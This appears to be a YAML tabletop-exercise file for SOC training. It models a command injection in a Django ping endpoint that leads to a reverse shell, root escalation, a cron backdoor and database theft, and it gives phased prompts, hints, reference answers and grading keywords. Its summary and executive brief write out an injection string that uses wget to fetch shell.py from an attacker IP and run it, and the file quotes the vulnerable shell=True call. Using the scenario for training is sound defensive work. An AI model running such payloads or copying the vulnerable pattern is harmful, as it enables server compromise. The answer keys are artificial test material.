@@ -1,0 +1,214 @@
+id: os_command_injection___web_shell_deployment
+name: OS Command Injection — Web Shell Deployment
+category: Web App
+format_version: 2
+difficulty: Critical
+soc_tier: L1
+roles:
+- analyst
+- incident_manager
+- ciso
+- executive
+industries:
+- all
+briefings:
+  analyst: You are the Tier-1 SOC analyst on shift. Your SIEM has fired an alert. Triage the scope, identify compromised assets, and take initial containment actions. Preserve evidence and escalate to the incident manager when the incident exceeds L1 scope.
+  incident_manager: You are the Incident Manager coordinating the response to Command Injection Leads to Web Shell and Full Server Compromise. Drive containment, evidence preservation, escalation, and cross-team communications; keep the war-room bridge aligned and document every major decision.
+  ciso: You are the CISO accountable for Command Injection Leads to Web Shell and Full Server Compromise. Weigh business impact, legal and regulatory notification duties, customer commitments, and the risk of disruptive containment.
+  executive: You are the executive sponsor for Command Injection Leads to Web Shell and Full Server Compromise. Focus on business continuity, budget and resource approval, customer and partner communications, and the timing of external disclosure.
+executive_brief: 'Executive summary of the Command Injection Leads to Web Shell and Full Server Compromise incident. Your organization runs a file management service at files.acmecorp.com (Python/Django on Ubuntu 22.04, Nginx reverse proxy). The service has a ''diagnose connection'' feature at /api/diagnose that runs a ping test to user-supplied hostnames using subprocess.call(''ping -c 3 '' + user_input, shell=True). At 11:30 today, the WAF detected command injection patterns but the request was already processed before the WAF rule triggered. The attacker from IP 177.54.xx.xx injected: ''; wget http://177.54.xx.xx/shell.py -O /var/www/html/static/.x.py; python3 /var/www/html/static/.x.py &'' — deploying a Python reverse shell. The attacker established a reverse shell, escalated to root via sudo misconfiguration (the Django app runs as a user with passwordless sudo on python3), installed a persistent cron-based backdoor, and exfiltrated the application''s PostgreSQL database (customer accounts,
+  file metadata, API keys for cloud storage). The attacker accessed the server from 11:31 to 13:45 — over 2 hours before the SOC was alerted by the outbound connection to 177.54.xx.xx. Business impact: customer-facing service availability and data confidentiality are at risk, and customer notification may be required. Immediate decisions: authorize containment that may interrupt service, preserve forensic evidence, and agree the external communication cadence with legal and communications. Regulatory exposure: privacy counsel should assess breach-notification duties for exposed customer records.'
+incident:
+  title: Command Injection Leads to Web Shell and Full Server Compromise
+  opening: Your organization runs a file management service at files.acmecorp.com (Python/Django on Ubuntu 22.04, Nginx reverse proxy). The service has a 'diagnose connection' feature at /api/diagnose that runs a ping test to user-supplied hostnames using subprocess.call('ping -c 3 ' + user_input, shell=True).
+  summary: 'Your organization runs a file management service at files.acmecorp.com (Python/Django on Ubuntu 22.04, Nginx reverse proxy). The service has a ''diagnose connection'' feature at /api/diagnose that runs a ping test to user-supplied hostnames using subprocess.call(''ping -c 3 '' + user_input, shell=True). At 11:30 today, the WAF detected command injection patterns but the request was already processed before the WAF rule triggered. The attacker from IP 177.54.xx.xx injected: ''; wget http://177.54.xx.xx/shell.py -O /var/www/html/static/.x.py; python3 /var/www/html/static/.x.py &'' — deploying a Python reverse shell. The attacker established a reverse shell, escalated to root via sudo misconfiguration (the Django app runs as a user with passwordless sudo on python3), installed a persistent cron-based backdoor, and exfiltrated the application''s PostgreSQL database (customer accounts, file metadata, API keys for cloud storage). The attacker accessed the server from 11:31 to 13:45
+    — over 2 hours before the SOC was alerted by the outbound connection to 177.54.xx.xx.'
+  compromised_assets:
+  - files.acmecorp.com (full root access)
+  - PostgreSQL database
+  - Cloud storage API keys
+  - Persistent cron backdoor
+  detected_via: 'EDR alert: outbound connection to known malicious IP from web server process'
+  kill_chain:
+  - Initial Access
+  - Execution
+  - Privilege Escalation
+  - Persistence
+  - Collection
+  - Exfiltration
+  mitre_tactics:
+  - Initial Access
+  - Execution
+  - Privilege Escalation
+  - Persistence
+  - Collection
+phases:
+- id: immediate_isolation_phase_1
+  phase_type: triage
+  title: Immediate Isolation — Phase 1
+  situation: The attacker has root access to the server, has installed a persistent cron backdoor, and has exfiltrated the database. The server is fully compromised. The attacker's reverse shell may still be active.
+  prompt: What is the immediate containment approach?
+  guidance:
+    what: 'Frame the decision for ''Immediate Isolation — Phase 1'': the asset at risk, the evidence available, and the time pressure.'
+    action: What is the immediate containment approach?
+    why: Every later decision depends on an accurate picture of files.acmecorp.com and the accounts involved.
+  hint: 'Start with the alert itself: which asset, account, and time window are actually in scope? Focus: Immediate Isolation — Phase 1. Asset in scope: files.acmecorp.com.'
+  hints:
+  - Consider pulling the relevant logs for the affected window.
+  - Think about which accounts or assets could be affected.
+  ideal_concepts:
+  - isolate server
+  - server network
+  - network immediately
+  - immediately acl
+  - acl firewall
+  - firewall rule
+  - rule preserve
+  - preserve server
+  reference_answer: |-
+    Isolate the server from the network immediately (ACL/firewall rule), preserve the server state for forensics (don't power off), kill the reverse shell connection, and begin incident response for the database exfiltration
+
+    Why: Network isolation stops ongoing damage while preserving evidence. The database exfiltration requires separate IR handling.
+  followup_good: 'The server is isolated. You need to collect evidence before rebuilding: memory dump, disk image, cron jobs, network connections, process list, and the attacker''s web shell. The attacker was on the server for over 2 hours with root access.'
+  followup_weak: |-
+    Network isolation stops ongoing damage while preserving evidence.
+
+    The server is isolated. You need to collect evidence before rebuilding: memory dump, disk image, cron jobs, network connections, process list, and the attacker's web shell. The attacker was on the server for over 2 hours with root access.
+  next: forensic_evidence_collection_phase_2
+  mitre_tactic: Execution
+  mitre_technique: T1059.006 Python
+- id: forensic_evidence_collection_phase_2
+  phase_type: containment
+  title: Forensic Evidence Collection — Phase 2
+  situation: 'The server is isolated. You need to collect evidence before rebuilding: memory dump, disk image, cron jobs, network connections, process list, and the attacker''s web shell. The attacker was on the server for over 2 hours with root access.'
+  prompt: What evidence do you collect?
+  guidance:
+    what: Identify the smallest set of containment actions that removes the attacker's access.
+    action: What evidence do you collect?
+    why: Stopping the spread is urgent, but destroying evidence makes the incident impossible to close.
+  hint: 'Prioritize the move that limits blast radius without destroying the evidence you will need later. Focus: Forensic Evidence Collection — Phase 2. Asset in scope: files.acmecorp.com.'
+  hints:
+  - Disk image misses volatile evidence (memory, running processes, network connections).
+  - Consider the affected accounts and their privilege level.
+  ideal_concepts:
+  - memory dump
+  - dump lime
+  - lime proc
+  - proc mem
+  - mem full
+  - full disk
+  - disk image
+  - image cron
+  reference_answer: |-
+    Memory dump (via LiME or /proc/mem), full disk image, cron job list, running processes, network connections, bash history for all users, the web shell source code, and Nginx/Django access logs for the full attack window
+
+    Why: Complete forensic evidence: volatile (memory, processes, connections) and persistent (disk, logs, web shell code).
+  followup_good: The /api/diagnose endpoint uses subprocess.call('ping -c 3 ' + user_input, shell=True). This allows arbitrary command injection. The server also has a sudo misconfiguration that allows the Django app user to run python3 as root without a password.
+  followup_weak: |-
+    Complete forensic evidence: volatile (memory, processes, connections) and persistent (disk, logs, web shell code).
+
+    The /api/diagnose endpoint uses subprocess.call('ping -c 3 ' + user_input, shell=True). This allows arbitrary command injection. The server also has a sudo misconfiguration that allows the Django app user to run python3 as root without a password.
+  next: command_injection_fix_phase_3
+  mitre_tactic: Collection
+  mitre_technique: T1005 Data from Local System
+- id: command_injection_fix_phase_3
+  phase_type: eradication
+  title: Command Injection Fix — Phase 3
+  situation: The /api/diagnose endpoint uses subprocess.call('ping -c 3 ' + user_input, shell=True). This allows arbitrary command injection. The server also has a sudo misconfiguration that allows the Django app user to run python3 as root without a password.
+  prompt: How do you fix the command injection and sudo misconfiguration?
+  guidance:
+    what: Decide what must be rebuilt or rotated rather than merely cleaned.
+    action: How do you fix the command injection and sudo misconfiguration?
+    why: Cleaning the visible payload while leaving persistence in place invites a second incident.
+  hint: 'Look beyond the visible payload for persistence, stolen credentials, and the original entry path. Focus: Command Injection Fix — Phase 3. Asset in scope: files.acmecorp.com.'
+  hints:
+  - An authenticated user could still inject commands.
+  - Update detection rules, playbooks, and training from this incident.
+  ideal_concepts:
+  - replace subprocess
+  - subprocess call
+  - shell true
+  - true subprocess
+  - subprocess run
+  - ping validated
+  - validated input
+  - input shell
+  reference_answer: |-
+    Replace subprocess.call(shell=True) with subprocess.run(['ping', '-c', '3', validated_input]) (no shell interpretation), implement strict input validation (allow only valid hostnames/IPs), fix sudo configuration to remove python3 from the NOPASSWD list, and rebuild the server from a clean image
+
+    Why: Root cause fix (no shell interpretation + input validation), privilege escalation fix (sudo), and clean rebuild.
+  followup_good: |-
+    The scenario ends here.
+
+    Executive summary of the Command Injection Leads to Web Shell and Full Server Compromise incident. Your organization runs a file management service at files.acmecorp.com (Python/Django on Ubuntu 22.04, Nginx reverse proxy). The service has a 'diagnose connection' feature at /api/diagnose that runs a ping test to user-supplied hostnames using subprocess.call('ping -c 3 ' + user_input, shell=True). At 11:30 today, the WAF detected command injection patterns but the request was already processed before the WAF rule triggered. The attacker from IP 177.54.xx.xx injected: '; wget http://177.54.xx.x...
+  followup_weak: |-
+    The scenario ends here.
+
+    Executive summary of the Command Injection Leads to Web Shell and Full Server Compromise incident. Your organization runs a file management service at files.acmecorp.com (Python/Django on Ubuntu 22.04, Nginx reverse proxy). The service has a 'diagnose connection' feature at /api/diagnose that runs a ping test to user-supplied hostnames using subprocess.call('ping -c 3 ' + user_input, shell=True). At 11:30 today, the WAF detected command injection patterns but the request was already processed before the WAF rule triggered. The attacker from IP 177.54.xx.xx injected: '; wget http://177.54.xx.x...
+  mitre_tactic: Defense Evasion
+  mitre_technique: T1565 Data Manipulation
+  next: recovery_and_validation
+- id: recovery_and_validation
+  phase_type: recovery
+  title: Recovery & Validation
+  situation: Containment is holding and the attacker's active access has been removed. files.acmecorp.com is quarantined or offline, and business owners are asking when service can resume. Backups, rebuild images, and a change window are available — but the root cause must be proven fixed first.
+  prompt: What must be true before you return files.acmecorp.com to production?
+  guidance:
+    what: Decide how to restore service in stages while proving the environment is free of reinfection.
+    action: What must be true before you return files.acmecorp.com to production?
+    why: Business trust depends on returning service with evidence that the environment is safe.
+  hint: 'Trusted backups and proof of cleanliness come before speed; a fast restore can reopen the incident. Focus: Recovery & Validation. Asset in scope: files.acmecorp.com.'
+  hints:
+  - Which backup or rebuild image is known-good for files.acmecorp.com, and when was it validated?
+  - Which credentials or certificates were exposed and must be rotated before restore?
+  - What monitoring will prove the attacker has not returned after service resumes?
+  ideal_concepts:
+  - known-good backup
+  - integrity validation
+  - credential rotation
+  - reinfection monitoring
+  - staged restoration
+  - business sign-off
+  reference_answer: |-
+    Restore files.acmecorp.com from a known-good backup or rebuild it from a trusted image, validate system and data integrity, rotate every credential and certificate exposed during the incident, and monitor the restored environment for reinfection before handing it back to the business.
+
+    Why: Recovery is only complete when the root cause is fixed and the restored asset is proven clean; restoring compromised infrastructure reopens the incident.
+  followup_good: Services are restored in stages from trusted sources, exposed credentials are rotated, and monitoring confirms no reinfection. The business signs off on the restored service with evidence attached.
+  followup_weak: The asset is back online, but the root cause and credential exposure were not fully validated. The attacker still has a path back in, and the incident may reopen under a new alert.
+  next: post_incident_review
+  next_weak: ''
+  mitre_tactic: Defense Evasion
+  mitre_technique: T1565 Data Manipulation
+  role_prompts: {}
+- id: post_incident_review
+  phase_type: lessons
+  title: Post-Incident Review & Hardening
+  situation: Service has been restored and validated. Leadership wants a concise after-action review covering the root cause of Command Injection Leads to Web Shell and Full Server Compromise, the detection gap that let the attacker operate, and the control changes that will prevent a repeat. Findings must have owners and dates.
+  prompt: What must change so an incident like Command Injection Leads to Web Shell and Full Server Compromise is detected earlier and cannot recur?
+  guidance:
+    what: Identify the decisions that would have shortened the incident if they had been made earlier.
+    action: What must change so an incident like Command Injection Leads to Web Shell and Full Server Compromise is detected earlier and cannot recur?
+    why: Lessons are only real when they change a control, a detection, or a decision right.
+  hint: 'Turn this incident into one detection improvement and one preventive control that outlast the report. Focus: Post-Incident Review & Hardening. Asset in scope: files.acmecorp.com.'
+  hints:
+  - What was the earliest signal available, and why was it missed?
+  - Which control would have stopped the attack chain the earliest?
+  - Who owns each improvement, and when will it be verified?
+  ideal_concepts:
+  - root cause
+  - detection gap
+  - control improvement
+  - owner and date
+  - runbook update
+  - training
+  reference_answer: |-
+    Document the root cause of Command Injection Leads to Web Shell and Full Server Compromise, identify the detection gap that let the attacker operate, and assign owners and dates to concrete control changes. Update detections, runbooks, and training, track the actions to completion, and report the outcome to leadership.
+
+    Why: Without durable changes, the same root cause will produce the same incident again.
+  followup_good: The review names the root cause and detection gap, assigns owned and dated improvements, and ties them back to specific detections and controls. Leadership receives a tracked action plan.
+  followup_weak: The review retells the timeline but leaves the root cause and detection gap vague. Without owners, dates, and verification, the same incident will recur.
+  next: ''
+  next_weak: ''
+  mitre_tactic: Defense Evasion
+  mitre_technique: T1565 Data Manipulation
+  role_prompts: {}
